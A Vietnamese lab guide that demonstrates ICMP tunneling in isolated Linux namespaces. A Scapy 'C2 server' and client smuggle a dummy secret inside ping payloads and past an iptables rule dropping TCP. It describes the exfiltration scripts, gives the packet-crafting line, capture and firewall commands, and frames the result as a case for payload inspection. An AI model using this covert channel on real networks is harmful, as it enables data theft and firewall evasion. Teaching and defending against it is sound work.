# HƯỚNG DẪN TRIỂN KHAI & PHÂN TÍCH KỸ THUẬT: LAB 03
## ICMP Tunneling (Covert Channel & Data Exfiltration)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG

#### 1.1 Mục Tiêu & Cơ Sở Lý Thuyết
- **Bản chất giao thức ICMP Echo (RFC 792):** Giao thức ICMP định nghĩa cặp thông điệp Echo Request (Type 8) và Echo Reply (Type 0) dùng để kiểm tra độ trễ (RTT) và độ thông suốt mạng. Tiêu chuẩn RFC 792 quy định trường dữ liệu tải trọng (`Data Payload`) có độ dài linh hoạt và nội dung dữ liệu nhận được trong Echo Request bắt buộc phải được gửi trả lại nguyên vẹn trong Echo Reply.
- **Lỗ hổng khái niệm (Architectural Weakness):** RFC 792 không có cơ chế kiểm tra tính hợp lệ về mặt ngữ nghĩa (semantic validation) của payload. Hệ thống bình thường chỉ chèn dữ liệu đệm chuẩn (như bảng chữ cái hoặc dấu thời gian). Kẻ tấn công có thể chèn dữ liệu nhạy cảm, tài liệu mật hoặc lệnh shell vào trường này để thiết lập kênh truyền thông bí mật (Covert Channel - khởi xướng từ dự án Loki 1996).
- **Vượt tường lửa tầng 4 (L4 Firewall Evasion):** Các tường lửa lọc gói tin tầng 4 kiểm tra cổng TCP/UDP (`sport`, `dport`). Vì ICMP hoạt động ở tầng Network (không có khái niệm Port) và thường được quản trị viên mở mặc định cho lệnh `ping` chẩn đoán mạng, lưu lượng ngầm ICMP có thể dễ dàng vượt qua tường lửa để tuồn dữ liệu (Data Exfiltration) ra ngoài.
- **Mục tiêu thực nghiệm trong Lab 03:**
  1. Xây dựng chương trình Client (`h1`) và Server C2 (`h2`) giao tiếp ngầm 2 chiều qua ICMP.
  2. Bắt gói tin và chứng minh dữ liệu mật (`tainbow`) được truyền tải dưới dạng cleartext trong payload ICMP.
  3. Thiết lập tường lửa `iptables` chặn toàn bộ cổng TCP trên Server, chứng minh kết nối TCP bị khóa nhưng kênh ngầm ICMP vẫn hoạt động thông suốt.

#### 1.2 Topology Mạng & Quy Ước Thực Thi
- **Mô hình kết nối:** Cặp Network Namespaces nối qua `veth1` $\leftrightarrow$ `veth2`:
  - `[CLIENT - h1]`: `10.0.0.1/24` (Client nội bộ / Kẻ tuồn dữ liệu) trên giao diện `veth1`.
  - `[SERVER C2 - h2]`: `10.0.0.2/24` (Server ngoài / C2 Server) trên giao diện `veth2`.

> 💡 **Quy ước thực thi lệnh:**
> - `[CLIENT - h1]`: Lệnh chạy trong namespace client tuồn dữ liệu (tiền tố `ip netns exec h1`).
> - `[SERVER C2 - h2]`: Lệnh chạy trong namespace máy chủ C2 nhận dữ liệu (tiền tố `ip netns exec h2`).
> - `[HOST / CHUNG]`: Lệnh chạy trực tiếp trên máy ảo Kali.

---

### 2. BƯỚC 1: KHỞI TẠO THƯ MỤC VÀ TẠO CÁC SCRIPT

Trong bước này, ta chuẩn bị 3 tệp kịch bản tại `/tmp/lab03`:

#### 2.1 Kịch Bản `setup_pair.sh` (Isolated Network Setup)
- **Tại sao lại đặt tên như vậy?** Đặt tên là `setup_pair` vì kịch bản này tạo một cặp host mạng ảo (`h1` và `h2`) kết nối trực tiếp qua `veth pair`.
- **Ý nghĩa của script:** Thiết lập môi trường mạng cô lập và cấu hình nhân kernel của máy chủ để nhường quyền xử lý ICMP cho ứng dụng tầng người dùng (user-space).
- **Ý chính của script làm gì?**
  1. Tạo namespace `h1`, `h2` và cặp card mạng ảo `veth1`, `veth2` với IP `10.0.0.1/24` và `10.0.0.2/24`.
  2. Thiết lập tham số hạt nhân: `sysctl -w net.ipv4.icmp_echo_ignore_all=1` trên `h2`.
- **Móc nối lý thuyết (Theory Hook):**
  - *Tại sao cần tắt kernel auto-reply trên Server?* Khi một gói tin ICMP Echo Request tới máy chủ, theo mặc định mã kernel Linux sẽ tự động sinh ngay một gói Echo Reply gửi trả lại. Nếu ứng dụng Scapy Server ở user-space cũng bắt gói và gửi gói Reply chứa thông điệp ACK/Command, client sẽ nhận được tới hai phản hồi (một phản hồi mặc định từ kernel và một từ Scapy). Việc cấu hình `icmp_echo_ignore_all=1` loại bỏ hoàn toàn phản hồi tự động của kernel, trao quyền kiểm soát tuyệt đối luồng phản hồi cho ứng dụng C2 Server.

#### 2.2 Kịch Bản `icmp_server.py` (Covert Channel C2 Listener)
- **Tại sao lại đặt tên như vậy?** Tên gọi ghép từ `icmp` và `server` thể hiện rõ vai trò là máy chủ lắng nghe kênh ngầm ICMP.
- **Ý nghĩa của script:** Đóng vai trò là máy chủ Command & Control (C2) tiếp nhận dữ liệu bị đánh cắp và phản hồi xác nhận qua kênh truyền bí mật.
- **Ý chính của script làm gì?**
  1. Dùng hàm `sniff()` trên giao diện `veth2` với bộ lọc `"icmp"`.
  2. Khi bắt được gói Echo Request (`type == 8`), trích xuất tải trọng trong tầng `Raw` (`pkt[Raw].load`).
  3. Tạo gói Echo Reply (`type == 0`) mang cùng `id` và `seq` của request, gắn payload xác nhận `b"ACK:" + payload` và bắn ngược về Client.
- **Móc nối lý thuyết (Theory Hook):**
  - Móc nối với quy trình giao tiếp 2 chiều trong Covert Channel: Kênh ngầm không chỉ truyền 1 chiều (tuồn dữ liệu ra ngoài) mà còn hỗ trợ chiều về (Server gửi mã lệnh thực thi, thông báo xác nhận) được ngụy trang hoàn hảo dưới vỏ bọc một gói Echo Reply vô hại.

#### 2.3 Kịch Bản `icmp_client.py` (Data Exfiltration Client)
- **Tại sao lại đặt tên như vậy?** Tên gọi thể hiện vai trò máy trạm khách thực hiện hành vi đánh cắp dữ liệu.
- **Ý nghĩa của script:** Chương trình mô phỏng mã độc chạy trong mạng nội bộ nạn nhân, thu thập thông tin mật và nhồi vào gói tin ICMP để gửi ra ngoài.
- **Ý chính của script làm gì?**
  1. Khởi tạo dữ liệu bí mật cần tuồn: chuỗi byte `b"tainbow"`.
  2. Chế tạo gói tin `IP(dst="10.0.0.2") / ICMP(type=8, id=0x1337, seq=1) / Raw(load=SECRET_DATA)`.
  3. Dùng hàm `sr1()` để gửi gói tin và chờ phản hồi ACK từ Server trong thời gian tối đa 3 giây.
- **Móc nối lý thuyết (Theory Hook):**
  - Móc nối với kỹ thuật Data Exfiltration: Bằng cách nhúng dữ liệu vào trường `Raw` nằm sau tiêu đề ICMP, kích thước gói tin vẫn nằm trong phạm vi chuẩn (64-128 bytes), không gây chú ý cho các hệ thống giám sát băng thông thông thường.

---

### 3. BƯỚC 2: CHẠY THIẾT LẬP MẠNG

Thực thi kịch bản thiết lập:

```bash
# [HOST / CHUNG] Thiết lập topology h1 <-> h2
sudo bash /tmp/lab03/setup_pair.sh
```

#### Phân Tích Cú Pháp & Các Lệnh Quan Trọng:
1. `sysctl -w net.ipv4.icmp_echo_ignore_all=1`:
   - Tham số này điều khiển hành vi của subsystem ICMP trong kernel Linux.
   - Khi thiết lập `= 1`, kernel sẽ âm thầm drop các yêu cầu Echo Request mà không bao giờ phản hồi Echo Reply. Tuy nhiên, các raw socket (như của Scapy hoặc tcpdump) vẫn nhận được gói tin ở tầng liên kết dữ liệu / mạng, cho phép tiến trình python xử lý tự do.
2. `ping -c 1 -W 1 10.0.0.2`:
   - Kiểm tra baseline mạng: Gói ping thông thường từ kernel sẽ bị timeout (do server đã tắt auto-reply), xác nhận môi trường đã sẵn sàng cho Scapy Server tiếp quản.

---

### 4. BƯỚC 3: KHỞI CHẠY KÊNH TRUYỀN NGẦM ICMP

Khởi chạy hệ thống theo thứ tự: Server lắng nghe $\rightarrow$ Sniffer bắt gói $\rightarrow$ Client truyền dữ liệu:

```bash
# 1. [SERVER C2 - h2] Khởi chạy Server trong background trên h2
sudo ip netns exec h2 python3 /tmp/lab03/icmp_server.py > /tmp/lab03/server.log 2>&1 &
SERVER_PID=$!
sleep 1

# 2. [SERVER C2 - h2] Mở tcpdump với cờ -A để đọc rõ payload ASCII
sudo ip netns exec h2 tcpdump -i veth2 -nn -A icmp > /tmp/lab03/tcpdump_payload.log 2>&1 &
sleep 1

# 3. [CLIENT - h1] Chạy Client trên h1 để tuồn chuỗi dữ liệu tainbow
sudo ip netns exec h1 python3 /tmp/lab03/icmp_client.py
sleep 2
```

#### Phân Tích Cú Pháp & Các Lệnh Quan Trọng:
1. `tcpdump -i veth2 -nn -A icmp`:
   - `-A` (ASCII Output): **Cờ kiểm thử quan trọng nhất trong Lab 03**.
     - Mặc định, tcpdump chỉ hiển thị các trường tiêu đề (IP, port, ICMP type/code).
     - Cờ `-A` yêu cầu tcpdump in toàn bộ phần dữ liệu tải trọng (Payload) dưới dạng chuỗi ký tự ASCII rõ ràng (cleartext). Lệnh này cho phép ta nhìn thấy trực tiếp chuỗi ký tự mật được nhồi bên trong gói tin ICMP mà không cần phải mở file PCAP bằng Wireshark.
   - `icmp`: Chỉ bắt các gói thuộc giao thức ICMP (giao thức số 1).

---

### 5. BƯỚC 4: KIỂM CHỨNG KẾT QUẢ DỮ LIỆU TUỒN

Kiểm tra kết quả tiếp nhận tại Server và log bắt gói chi tiết:

```bash
# 1. [SERVER C2 - h2] Xem nhật ký Server tiếp nhận dữ liệu
cat /tmp/lab03/server.log

# 2. [HOST / CHUNG] Tắt tiến trình Scapy Server
sudo kill $SERVER_PID 2>/dev/null || sudo pkill -f icmp_server.py 2>/dev/null || true

# 3. [SERVER C2 - h2] Xem log bắt gói tcpdump hiển thị cleartext
cat /tmp/lab03/tcpdump_payload.log
```

#### Phân Tích Chi Tiết Dữ Liệu Bắt Gói:
1. **Tại `server.log`:**
   ```text
   [*] ICMP Tunnel Server đang lắng nghe trên veth2...
   [+] Nhận dữ liệu ngầm từ 10.0.0.1: b'tainbow'
   [+] Đã phản hồi ACK tới 10.0.0.1
   ```
   Server nhận trọn vẹn chuỗi bí mật `tainbow` và gửi lại chuỗi xác nhận `ACK:tainbow`.
2. **Tại `tcpdump_payload.log`:**
   ```text
   11:45:02.102345 IP 10.0.0.1 > 10.0.0.2: ICMP echo request, id 4919, seq 1, length 15
   E..#..@.@..7
   ...
   ..7.....tainbow
   
   11:45:02.105432 IP 10.0.0.2 > 10.0.0.1: ICMP echo reply, id 4919, seq 1, length 19
   E..'...@.@..4
   ...
   ..7.....ACK:tainbow
   ```
   Nhờ cờ `-A`, ta thấy xuất hiện rõ ràng từ `tainbow` trong gói Request và `ACK:tainbow` trong gói Reply. Điều này chứng minh dữ liệu mật đã được mang đi trót lọt trong luồng ping thông thường.

---

### 6. BƯỚC 5: KIỂM CHỨNG VƯỢT TƯỜNG LỬA TẦNG 4 (FIREWALL EVASION)

Thiết lập kịch bản tường lửa điển hình: Chặn toàn bộ kết nối TCP (như HTTP, SSH) nhưng bỏ quên giao thức ICMP:

```bash
# 1. [SERVER C2 - h2] Thiết lập luật iptables trên h2 chặn toàn bộ lưu lượng TCP
sudo ip netns exec h2 iptables -A INPUT -p tcp -j DROP

# 2. [CLIENT - h1] Kiểm tra kết nối TCP thông thường bằng nc
sudo ip netns exec h1 nc -zvw 2 10.0.0.2 80

# 3. [CLIENT - h1] Kiểm tra lại kênh truyền ngầm ICMP
sudo ip netns exec h1 python3 /tmp/lab03/icmp_client.py
```

#### Phân Tích Cú Pháp & Kết Quả Phòng Thủ / Vượt Tường Lửa:
1. `iptables -A INPUT -p tcp -j DROP`:
   - Gắn luật vào chuỗi `INPUT` (lưu lượng đi vào máy `h2`).
   - `-p tcp`: Khóa toàn bộ các gói tin thuộc giao thức TCP trên mọi cổng.
2. `nc -zvw 2 10.0.0.2 80`:
   - `-z` (Zero-I/O mode): Chế độ quét cổng (chỉ thực hiện bắt tay thăm dò mà không truyền dữ liệu).
   - `-v` (Verbose): Hiển thị chi tiết trạng thái kết nối.
   - `-w 2`: Giới hạn thời gian chờ tối đa 2 giây.
   - **Kết quả:** Lệnh `nc` bị treo 2 giây và báo lỗi Timeout (mã thoát khác 0), chứng minh chính sách tường lửa L4 đang khóa chặt mọi giao tiếp TCP.
3. Chạy lại `icmp_client.py`:
   - **Kết quả:** Kịch bản python thông báo:
     ```text
     [+] Nhận thành công phản hồi từ Server: b'ACK:tainbow'
     ```
   - **Ý nghĩa bảo mật:** Dù tường lửa L4 đã khóa hoàn toàn TCP, kênh truyền ngầm ICMP vẫn hoạt động bình thường, chứng minh lỗ hổng nghiêm trọng của các kiến trúc phòng ngự chỉ tập trung vào việc lọc số cổng TCP/UDP mà không kiểm tra sâu vào nội dung tải trọng ICMP (Deep Packet Inspection - DPI).

---

### 7. BƯỚC 6: DỌN DẸP MÔI TRƯỜNG

Khôi phục hệ thống:

```bash
# [HOST / CHUNG] Tắt tiến trình nền và xóa namespaces
sudo pkill -f icmp_server.py 2>/dev/null || true
sudo pkill -f tcpdump 2>/dev/null || true
sudo ip netns exec h2 iptables -F 2>/dev/null || true
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo rm -rf /tmp/lab03
```

- `iptables -F` (Flush): Xóa bỏ toàn bộ các luật firewall đã thêm vào bảng filter để tránh ảnh hưởng đến các thử nghiệm mạng sau đó.
- Xóa namespaces `h1`, `h2` và thư mục `/tmp/lab03`.

